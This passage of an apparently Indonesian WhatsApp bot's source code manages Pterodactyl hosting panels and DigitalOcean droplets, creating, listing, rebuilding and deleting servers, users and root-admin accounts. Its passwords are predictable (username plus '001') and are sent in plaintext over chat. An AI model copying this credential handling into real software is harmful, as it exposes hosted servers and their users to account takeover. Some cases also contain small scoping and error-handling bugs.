        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat
    }

    try {
        var onWa = await sock.onWhatsApp(nomor.split("@")[0]);
        if (onWa.length < 1) return reply("Nomor target tidak terdaftar di WhatsApp!");
    } catch (err) {
        return reply("Terjadi kesalahan saat mengecek nomor WhatsApp: " + err.message);
    }

    // Mapping RAM, Disk, dan CPU
    const resourceMap = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };
    
    let { ram, disk, cpu } = resourceMap[command] || { ram: "0", disk: "0", cpu: "0" };

    let username = usernem.toLowerCase();
    let email = username + "@gmail.com";
    let name = global.capital(username) + " Server";
    let password = username + "001";

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({ email, username, first_name: name, last_name: "Server", language: "en", password })
        });
        let data = await f.json();
        if (data.errors) return reply("Error: " + JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;

        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
            method: "GET",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey }
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;

        let f2 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({
                name,
                description: global.tanggal(Date.now()),
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup: startup_cmd,
                environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
            })
        });
        let result = await f2.json();
        if (result.errors) return reply("Error: " + JSON.stringify(result.errors[0], null, 2));
        
        let server = result.attributes;
        var orang = nomor
        if (orang !== m.chat) {
        await reply(`Berhasil membuat akun panel ✅\ndata akun terkirim ke nomor ${nomor.split("@")[0]}`)
        }

let teks = `
*Berikut detail akun panel kamu*

📡 Server ID: ${server.id}
👤 Username: \`${user.username}\`
🔐 Password: \`${password}\`
🗓️ Tanggal Aktivasi: ${global.tanggal(Date.now())}

*⚙️ Spesifikasi server panel*
- RAM: ${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}
- Disk: ${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}
- CPU: ${cpu == "0" ? "Unlimited" : cpu + "%"}
- Panel: ${global.domain}

*Rules pembelian panel :*  
- Masa aktif 30 hari  
- Data bersifat pribadi, mohon disimpan dengan aman  
- Garansi berlaku 15 hari (1x replace)  
- Klaim garansi wajib menyertakan *bukti chat pembelian*
`
        await sock.sendMessage(orang, { text: teks }, { quoted: m });
    } catch (err) {
        return reply("Terjadi kesalahan: " + err.message);
    }
}
break

//=============================================//

case "cvps":
case "createvps": {
  if (!isOwner) return reply(mess.owner)

  const [hostname, password] = text.split(",").map(v => v?.trim());
  if (!hostname || !password) {
    return reply("Format salah!\n*contoh:* .cvps hostname,password");
  }

  global.tempCreateVPS = {
    user: m.sender,
    step: "await-os",
    hostname: hostname.toLowerCase(),
    password
  };

  // Tahap 1: Pilih OS
  let osOptions = [
    { title: 'Ubuntu', id: `.cvp-os ubuntu` },
    { title: 'Debian', id: `.cvp-os debian` },
    { title: 'CentOS', id: `.cvp-os centos` }
  ];

  return await sock.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'select-os',
        buttonText: { displayText: 'Pilih OS' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Sistem Operasi',
            sections: [{ title: 'Available OS', rows: osOptions }]
          })
        }
      }
    ],
    text: `\n- Hostname: *${hostname}*\n- Password: *${password}*\n\nSilakan pilih sistem operasi VPS\n`,
    headerType: 1,
    viewOnce: true
  }, { quoted: m });
}
break;

case "cvp-os": {
  const os = text.trim().toLowerCase();
  if (!['ubuntu', 'debian', 'centos'].includes(os)) return reply("OS tidak valid.");

  if (!global.tempCreateVPS || global.tempCreateVPS.user !== m.sender) {
    return reply("Data sebelumnya tidak ditemukan.\nKetik ulang .cvps hostname,password");
  }

  global.tempCreateVPS.os = os;
  global.tempCreateVPS.step = "await-config";

  let options = [];

  if (os === "ubuntu") {
    options = [
      { title: '1 vCPU / 1GB RAM - sgp1 - Ubuntu 22.04', id: `.cvp-final s-1vcpu-1gb|sgp1|22-04` },
      { title: '2 vCPU / 2GB RAM - sgp1 - Ubuntu 22.04', id: `.cvp-final s-2vcpu-2gb|sgp1|22-04` },
      { title: '4 vCPU / 8GB RAM - sgp1 - Ubuntu 22.04', id: `.cvp-final s-4vcpu-8gb|sgp1|22-04` },
      { title: '8 vCPU / 16GB RAM - sgp1 - Ubuntu 22.04', id: `.cvp-final s-8vcpu-16gb|sgp1|22-04` }
    ];
  } else if (os === "debian") {
    options = [
      { title: '1 vCPU / 1GB RAM - nyc1 - Debian 11', id: `.cvp-final s-1vcpu-1gb|nyc1|11` },
      { title: '2 vCPU / 2GB RAM - nyc1 - Debian 11', id: `.cvp-final s-2vcpu-2gb|nyc1|11` },
      { title: '4 vCPU / 8GB RAM - nyc1 - Debian 11', id: `.cvp-final s-4vcpu-8gb|nyc1|11` },
      { title: '8 vCPU / 16GB RAM - nyc1 - Debian 11', id: `.cvp-final s-8vcpu-16gb|nyc1|11` }
    ];
  } else if (os === "centos") {
    options = [
      { title: '1 vCPU / 1GB RAM - sfo3 - CentOS 7', id: `.cvp-final s-1vcpu-1gb|sfo3|7` },
      { title: '2 vCPU / 2GB RAM - sfo3 - CentOS 7', id: `.cvp-final s-2vcpu-2gb|sfo3|7` },
      { title: '4 vCPU / 8GB RAM - sfo3 - CentOS 7', id: `.cvp-final s-4vcpu-8gb|sfo3|7` },
      { title: '8 vCPU / 16GB RAM - sfo3 - CentOS 7', id: `.cvp-final s-8vcpu-16gb|sfo3|7` }
    ];
  }

  return await sock.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'select-config',
        buttonText: { displayText: 'Pilih Konfigurasi' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: `Pilih Konfigurasi`,
            sections: [
              {
                title: 'CPU / RAM - Region - Version',
                rows: options
              }
            ]
          })
        }
      }
    ],
    text: `\nOS dipilih: *${os}*\n\nSekarang pilih konfigurasi VPS\n`,
    headerType: 1,
    viewOnce: true
  }, { quoted: m });
}
break;

case "cvp-final": {
  if (!global.tempCreateVPS || global.tempCreateVPS.user !== m.sender) {
    return reply("Data sebelumnya tidak ditemukan.\nKetik ulang .cvps hostname,password");
  }

  const [image, region, version] = text.split("|").map(v => v.trim());
  if (!image || !region || !version) return reply("Data konfigurasi tidak valid.");

  let { hostname, password, os } = global.tempCreateVPS;
  delete global.tempCreateVPS;

  try {
    let dropletData = {
      name: hostname,
      region,
      size: image,
      image: `${os}-${version}-x64`,
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`,
      private_networking: null,
      volumes: null,
      tags: ['cvp']
    };

    await reply("Sedang membuat VPS, mohon tunggu...");
    let create = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let result = await create.json();
    if (!create.ok) throw new Error(result.message);

    const dropletId = result.droplet.id;
    await new Promise(res => setTimeout(res, 60000));

    let detail = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      }
    });
    let detailData = await detail.json();

    let ip = detailData.droplet.networks.v4[0]?.ip_address || 'Tidak ditemukan';

    let reply = `✅ *VPS BERHASIL DIBUAT!*\n\n`
      + `📌 *Hostname:* ${hostname}\n`
      + `📀 *OS:* ${os.toUpperCase()} ${version}\n`
      + `🌍 *Region:* ${region}\n`
      + `💾 *Image:* ${image}\n`
      + `🔐 *Password:* ${password}\n`
      + `📡 *IP Address:* ${ip}`;

    await sock.sendMessage(m.chat, { text: reply });
  } catch (err) {
    console.error(err);
    reply(`Gagal membuat VPS:\n${err.message}`);
  }
}
break;

//=============================================//

case 'listdroplet': {
if (!isOwner) return reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `- Droplet ID: ${droplet.id}
- Hostname: ${droplet.name}
- Username: Root
- IP: ${ipAddress}
- Ram: ${droplet.memory} MB
- Cpu: ${droplet.vcpus} CPU
- OS: ${droplet.image.distribution}
- Storage: ${droplet.disk} GB
- Status: ${droplet.status}\n`;
});
}
return reply(mesej)
});
} catch (err) {
reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//=============================================//

case 'deldroplet': {
if (!isOwner) return reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let rows = []
if (droplets.length === 0) {
return reply("Tidak ada droplet yang tersedia")
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
rows.push({
title: `${droplet.name} - ${ipAddress}`,
description: `${droplet.image.distribution} || Ram ${droplet.memory} MB || CPU ${droplet.vcpus} || Disk ${droplet.disk}`, 
id: `.deldroplet-response ${droplet.id}`
})
});
}
return sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Droplet Yang Ingin Dihapus Dari Digitalocean\nTotal Droplet: ${droplets.length}\n`
}, { quoted: m })
});
} catch (err) {
reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//=============================================//

case "deldroplet-response": {
if (!isOwner) return reply(mess.owner)
if (!text) return 
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
reply("Berhasil Menghapus Droplet ✅")
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//=============================================//

case "rebuildfinal": {
  if (!isOwner) return reply(mess.owner);
  if (!text || !text.includes("|")) return

  const [dropletId, image] = text.split("|").map(x => x.trim());

  try {
    const res = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${global.apiDigitalOcean}`
      },
      body: JSON.stringify({
        type: 'rebuild',
        image: image
      })
    });

    if (!res.ok) {
      const errorData = await res.json();
      return reply(`Gagal melakukan rebuild: ${errorData.message}`);
    }

    reply(`🔄 *Proses rebuild dimulai...*\n🆔 Droplet: ${dropletId}\n📀 Image: ${image}\n⏳ Tunggu sekitar 1 menit...`);

    await new Promise(resolve => setTimeout(resolve, 60000));

    const info = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${global.apiDigitalOcean}`
      }
    });

    if (info.ok) {
      const data = await info.json();
      const droplet = data.droplet;
      const ip = droplet.networks.v4.find(net => net.type === "public")?.ip_address || 'Tidak ada IP';
      return m.reply(
        `✅ *VPS berhasil direbuild!*\n\n`
        + `🆔 ID: ${droplet.id}\n`
        + `📀 Image: ${droplet.image.slug}\n`
        + `📡 IP: ${ip}\n\n`
        + `🔐 Gunakan password lama atau cek email DigitalOcean.`
      );
    } else {
      return reply("Gagal mengambil info VPS setelah rebuild.");
    }
  } catch (err) {
    reply(`Terjadi kesalahan: ${err.message}`);
  }
}
break;

//=============================================//

case "rebuildos": {
  if (!isOwner) return reply(mess.owner);
  if (!text) return reply("ID droplet tidak ditemukan!");

  const dropletId = text.trim();
  global.tempRebuild = { dropletId, user: m.sender };

  const osOptions = [
    { title: "Ubuntu 22.04", id: `.rebuildfinal ${dropletId}|ubuntu-22-04-x64` },
    { title: "Ubuntu 24.04", id: `.rebuildfinal ${dropletId}|ubuntu-24-04-x64` },
    { title: "Debian 11", id: `.rebuildfinal ${dropletId}|debian-11-x64` },
    { title: "Debian 12", id: `.rebuildfinal ${dropletId}|debian-12-x64` },
    { title: "CentOS 7", id: `.rebuildfinal ${dropletId}|centos-7-x64` }
  ];

  return sock.sendMessage(m.chat, {
    text: `\nPilih sistem operasi baru untuk VPS ID *${dropletId}*\n`,
    buttons: [{
      buttonId: 'pilih-os',
      buttonText: { displayText: 'Pilih OS' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih OS',
          sections: [{ title: 'Image OS DigitalOcean', rows: osOptions }]
        })
      }
    }],
    headerType: 1,
    viewOnce: true
  }, { quoted: m });
}
break;

//=============================================//

case "rebuildvps": {
  if (!isOwner) return reply(mess.owner);

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + global.apiDigitalOcean
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (err) {
        reply('Error mengambil data droplet: ' + err);
        return [];
      }
    };

    getDroplets().then(droplets => {
      if (droplets.length === 0) return reply("Tidak ada droplet yang tersedia.");

      let rows = droplets.map(droplet => {
        const ipv4 = droplet.networks.v4.find(net => net.type === "public");
        return {
          title: `${droplet.name} (${ipv4?.ip_address || "No IP"})`,
          description: `${droplet.image.distribution} || ${droplet.memory}MB RAM || ${droplet.vcpus} vCPU`,
          id: `.rebuildos ${droplet.id}`
        };
      });

      return sock.sendMessage(m.chat, {
        text: `\nPilih droplet yang ingin direbuild\n`,
        buttons: [{
          buttonId: 'pilih-rebuild',
          buttonText: { displayText: 'Pilih Droplet' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'List VPS Aktif',
              sections: [{ title: 'Pilih VPS untuk Rebuild', rows }]
            })
          }
        }],
        headerType: 1,
        viewOnce: true
      }, { quoted: m });
    });
  } catch (err) {
    reply('Terjadi kesalahan: ' + err.message);
  }
}
break;

//=============================================//

case "listpanel":
case "listserver": {
    if (!isOwner && !isGrupReseller) {
        return reply(`Fitur ini hanya untuk di dalam grup reseller panel`);
    }

    try {
        const response = await fetch(`${domain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return reply("Tidak ada server panel!");
        }

        let messageText = `\n*Total server panel :* ${servers.length}\n`

        for (const server of servers) {
            const s = server.attributes;

            const resStatus = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${capikey}`,
                },
            });

            const statusData = await resStatus.json();

            const ram = s.limits.memory === 0
                ? "Unlimited"
                : s.limits.memory >= 1024
                ? `${Math.floor(s.limits.memory / 1024)} GB`
                : `${s.limits.memory} MB`;

            const disk = s.limits.disk === 0
                ? "Unlimited"
                : s.limits.disk >= 1024
                ? `${Math.floor(s.limits.disk / 1024)} GB`
                : `${s.limits.disk} MB`;

            const cpu = s.limits.cpu === 0
                ? "Unlimited"
                : `${s.limits.cpu}%`;

            messageText += `
- ID : *${s.id}*
- Nama Server : *${s.name}*
- Ram : *${ram}*
- Disk : *${disk}*
- CPU : *${cpu}*
- Created : *${s.created_at.split("T")[0]}*\n`;
        }                  
        await reply(messageText)

    } catch (err) {
        console.error("Error listing panel servers:", err);
        reply("Terjadi kesalahan saat mengambil data server.");
    }
}
break;

//=============================================//

case "delpanel": {
    if (!isOwner) {
        return reply(mess.owner);
    }
    const rows = []
    rows.push({
title: `Hapus Semua`,
description: `Hapus semua server panel`, 
id: `.delpanel-all`
})            
    try {
        const response = await fetch(`${domain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return reply("Tidak ada server panel!");
        }

        let messageText = `\n*Total server panel :* ${servers.length}\n`

        for (const server of servers) {
            const s = server.attributes;

            const resStatus = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${capikey}`,
                },
            });

            const statusData = await resStatus.json();

            const ram = s.limits.memory === 0
                ? "Unlimited"
                : s.limits.memory >= 1024
                ? `${Math.floor(s.limits.memory / 1024)} GB`
                : `${s.limits.memory} MB`;

            const disk = s.limits.disk === 0
                ? "Unlimited"
                : s.limits.disk >= 1024
                ? `${Math.floor(s.limits.disk / 1024)} GB`
                : `${s.limits.disk} MB`;

            const cpu = s.limits.cpu === 0
                ? "Unlimited"
                : `${s.limits.cpu}%`;
            rows.push({
title: `${s.name} || ID:${s.id}`,
description: `Ram ${ram} || Disk ${disk} || CPU ${cpu}`, 
id: `.delpanel-response ${s.id}`
})            
        }                  
        await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Server Panel Yang Ingin Dihapus\n`
}, { quoted: m })

    } catch (err) {
        console.error("Error listing panel servers:", err);
        reply("Terjadi kesalahan saat mengambil data server.");
    }
}
break;

//=============================================//

case "delpanel-response": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return 
    
    try {
        const serverResponse = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
            }
        });
        const serverData = await serverResponse.json();
        const servers = serverData.data;
        
        let serverName;
        let serverSection;
        let serverFound = false;
        
        for (const server of servers) {
            const serverAttr = server.attributes;
            
            if (Number(text) === serverAttr.id) {
                serverSection = serverAttr.name.toLowerCase();
                serverName = serverAttr.name;
                serverFound = true;
                
                const deleteServerResponse = await fetch(domain + `/api/application/servers/${serverAttr.id}`, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                
                if (!deleteServerResponse.ok) {
                    const errorData = await deleteServerResponse.json();
                    console.error("Gagal menghapus server:", errorData);
                }
                
                break;
            }
        }
        
        if (!serverFound) {
            return reply("Gagal menghapus server!\nID server tidak ditemukan");
        }
        
        const userResponse = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
            }
        });
        const userData = await userResponse.json();
        const users = userData.data;
        
        for (const user of users) {
            const userAttr = user.attributes;
            
            if (userAttr.first_name.toLowerCase() === serverSection) {
                const deleteUserResponse = await fetch(domain + `/api/application/users/${userAttr.id}`, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                
                if (!deleteUserResponse.ok) {
                    const errorData = await deleteUserResponse.json();
                    console.error("Gagal menghapus user:", errorData);
                }
                
                break;
            }
        }
        
        await reply(`Barhasil Menghapus Sever Panel ✅\nNama Server: ${capital(serverName)}`);
        
    } catch (error) {
        console.error("Error dalam proses delpanel:", error);
        await reply("Terjadi kesalahan saat memproses permintaan");
    }
}
break;

//=============================================//

case "delpanel-all": {
if (!isOwner) return reply(mess.owner)
await reply(`Memproses penghapusan semua user & server panel yang bukan admin`)
try {
const PTERO_URL = global.domain
// Ganti dengan URL panel Pterodactyl
const API_KEY = global.apikey// API Key dengan akses admin

// Konfigurasi headers
const headers = {
  "Authorization": "Bearer " + API_KEY,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

// Fungsi untuk mendapatkan semua user
async function getUsers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    
    return [];
  }
}

// Fungsi untuk mendapatkan semua server
async function getServers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

// Fungsi untuk menghapus server berdasarkan UUID
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
  }
}

// Fungsi untuk menghapus user berdasarkan ID
async function deleteUser(userID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
  }
}

// Fungsi utama untuk menghapus semua user & server yang bukan admin
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0

  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Lewati admin: ${user.attributes.username}`);
      continue; // Lewati admin
    }

    const userID = user.attributes.id;
    const userEmail = user.attributes.email;

    console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);

    // Cari server yang dimiliki user ini
    const userServers = servers.filter(srv => srv.attributes.user === userID);

    // Hapus semua server user ini
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }

    // Hapus user setelah semua servernya terhapus
    await deleteUser(userID);
  }
await reply(`Berhasil menghapus ${totalSrv} user & server panel yang bukan admin.`)
}

// Jalankan fungsi
return deleteNonAdminUsersAndServers();
} catch (err) {
return m.reply(`${JSON.stringify(err, null, 2)}`)
}
}
break

case "cadmin": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply(`Masukan username & nomor (opsional)\n*contoh:* ${cmd} skyzopedia,628XXX`)
    let nomor, usernem;
    const tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek;
        if (!users || !nom) return reply(`Masukan username & nomor (opsional)\n*contoh:* ${cmd} skyzopedia,628XXX`)

        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat;
    }

    const onWa = await sock.onWhatsApp(nomor.split("@")[0]);
    if (onWa.length < 1) return reply("Nomor target tidak terdaftar di WhatsApp!");

    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
    const name = global.capital(args[0]);
    const password = `${username}001`;

    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password
            })
        });

        const data = await res.json();
        if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

        const user = data.attributes;
        const orang = nomor;

        if (nomor !== m.chat) {
            await reply(`Berhasil membuat akun admin panel ✅\nData akun terkirim ke nomor ${nomor.split("@")[0]}`);
        }

        const teks = `
*Berikut detail akun admin panel*

📡 Server ID: ${user.id}
👤 Username: \`${user.username}\`
🔐 Password: \`${password}\`
🗓️ Tanggal Aktivasi: ${global.tanggal(Date.now())}
*🌐* ${global.domain}

*Rules pembelian admin panel:*  
- Masa aktif 30 hari  
- Data bersifat pribadi, mohon disimpan dengan aman  
- Garansi berlaku 15 hari (1x replace)  
- Klaim garansi wajib menyertakan *bukti chat pembelian*
        `;

        await sock.sendMessage(orang, { text: teks }, { quoted: m });

    } catch (err) {
        console.error(err);
        reply("Terjadi kesalahan saat membuat akun admin panel.");
    }
}
break;

//=============================================//

case "deladmin": {
    if (!isOwner) return reply(mess.owner);
    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });
        const rows = []
        const data = await res.json();
        const users = data.data;

        const adminUsers = users.filter(u => u.attributes.root_admin === true);
        if (adminUsers.length < 1) return reply("Tidak ada admin panel.");

        let teks = `\n*Total admin panel :* ${adminUsers.length}\n`
        adminUsers.forEach((admin, idx) => {
            teks += `
- ID : *${admin.attributes.id}*
- Nama : *${admin.attributes.first_name}*
- Created : ${admin.attributes.created_at.split("T")[0]}
`;
rows.push({
title: `${admin.attributes.first_name} || ID:${admin.attributes.id}`,
description: `Created At: ${admin.attributes.created_at.split("T")[0]}`, 
id: `.deladmin-response ${admin.attributes.id}`
})            
        });

        await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Admin Panel Yang Ingin Dihapus\n`
}, { quoted: m })

    } catch (err) {
        console.error(err);
        reply("Terjadi kesalahan saat mengambil data admin.");
    }
}
break;

//=============================================//

case "deladmin-response": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return 
    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        const data = await res.json();
        const users = data.data;

        let targetAdmin = users.find(
            (e) => e.attributes.id == args[0] && e.attributes.root_admin === true
        );

        if (!targetAdmin) {
            return reply("Gagal menghapus akun!\nID user tidak ditemukan");
        }

        const idadmin = targetAdmin.attributes.id;
        const username = targetAdmin.attributes.username;

        const delRes = await fetch(`${domain}/api/application/users/${idadmin}`, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        if (!delRes.ok) {
            const errData = await delRes.json();
            return reply(`Gagal menghapus akun admin!\n${JSON.stringify(errData.errors[0], null, 2)}`);
        }

        await reply(`Berhasil Menghapus Admin Panel ✅\nNama User: ${global.capital(username)}`);

    } catch (err) {
        console.error(err);
        reply("Terjadi kesalahan saat menghapus akun admin.");
    }
}
break;

//=============================================//

case "listadmin": {
    if (!isOwner) return reply(mess.owner);

    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        const data = await res.json();
        const users = data.data;

        const adminUsers = users.filter(u => u.attributes.root_admin === true);
        if (adminUsers.length < 1) return reply("Tidak ada admin panel.");

        let teks = `\n*Total admin panel :* ${adminUsers.length}\n`
        adminUsers.forEach((admin, idx) => {
            teks += `
- ID : *${admin.attributes.id}*
